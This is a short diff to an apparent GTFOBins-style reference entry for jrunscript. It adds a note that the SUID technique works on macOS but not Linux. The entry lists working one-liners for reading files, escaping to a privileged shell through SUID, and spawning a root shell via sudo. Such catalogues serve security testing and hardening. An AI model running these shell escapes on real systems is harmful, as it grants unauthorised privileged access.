@@ -30,7 +30,8 @@ functions:
     - code: jrunscript -e 'br = new BufferedReader(new java.io.FileReader("file_to_read"));
          while ((line = br.readLine()) != null) { print(line); }'
   suid:
-    - code: ./jrunscript -e "exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')"
+    - description: This has been found working in macOS but failing on Linux systems.
+      code: ./jrunscript -e "exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')"
   sudo:
     - code: sudo jrunscript -e "exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')"
 ---
